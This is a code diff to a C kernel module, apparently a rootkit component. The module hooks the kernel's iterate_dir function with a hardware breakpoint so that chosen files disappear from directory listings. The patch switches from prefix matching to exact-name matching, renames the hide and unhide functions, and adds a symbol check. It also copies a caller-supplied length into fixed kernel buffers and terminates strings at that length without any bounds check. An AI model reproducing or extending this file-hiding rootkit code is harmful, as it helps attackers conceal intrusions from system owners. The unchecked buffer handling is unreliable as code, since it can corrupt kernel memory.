@@ -5,16 +5,14 @@
 #include <anima/x86.h>
 
 #define MAX_HIDDEN_FILES 50
-#define FILENAME_SIZE	 20
+#define FILENAME_SIZE	 50
 
 static char hidden_file[MAX_HIDDEN_FILES][FILENAME_SIZE] = { {0} };
 
 static int is_name_hidden(const char *name)
 {
 	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
-		unsigned int len = anima_strlen(hidden_file[i]);
-		if (hidden_file[i][0] &&
-		    !anima_strncmp(hidden_file[i], name, len)) {
+		if (hidden_file[i][0] && !anima_strcmp(hidden_file[i], name)) {
 			pr_debug("%s: hiding %s\n", __func__, name);
 			return 1;
 		}
@@ -53,7 +51,7 @@ static void iterate_dir_hook(struct pt_regs *regs)
 /*
  * VFS hook API
  */
-int hide_filename_starting_with(const char *name, unsigned int len)
+int hide_filename(const char *name, unsigned int len)
 {
 	pr_debug("%s: name=%s\n", __func__, name);
 
@@ -62,7 +60,7 @@ int hide_filename_starting_with(const char *name, unsigned int len)
 	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
 		if (!hidden_file[i][0]) {
 			ksyms._copy_from_user(hidden_file[i], name, len);
-			hidden_file[i][FILENAME_SIZE-1] = 0;
+			hidden_file[i][len] = 0;
 			return 0;
 		}
 	}
@@ -70,7 +68,7 @@ int hide_filename_starting_with(const char *name, unsigned int len)
 	return -1;
 }
 
-int unhide_filename_starting_with(const char *name, unsigned int len)
+int unhide_filename(const char *name, unsigned int len)
 {
 	char kname[FILENAME_SIZE];
 
@@ -78,11 +76,16 @@ int unhide_filename_starting_with(const char *name, unsigned int len)
 	if (ksyms._copy_from_user(kname, name, len))
 		return -1;
 
-	pr_debug("%s: name=%s\n", __func__, name);
+	kname[len] = 0;
 
-	for (int i = 0; i < MAX_HIDDEN_FILES; i++)
-		if (anima_strncmp(hidden_file[i], kname, FILENAME_SIZE))
+	pr_debug("%s: name=%s\n", __func__, kname);
+
+	for (int i = 0; i < MAX_HIDDEN_FILES; i++) {
+		if (!anima_strcmp(hidden_file[i], kname)) {
 			hidden_file[i][0] = 0;
+			pr_debug("hidden\n");
+		}
+	}
 
 	return 0;
 }
@@ -91,5 +94,9 @@ void hook_vfs(void)
 {
 	unsigned long iterate_dir_p = get_symbol_addr("iterate_dir");
 
-	x86_hw_breakpoint_register(1, iterate_dir_p, DR_RW_EXECUTE, 0, iterate_dir_hook);
+	if (!iterate_dir_p)
+		return;
+
+	x86_hw_breakpoint_register(1, iterate_dir_p, DR_RW_EXECUTE,
+					0, iterate_dir_hook);
 }
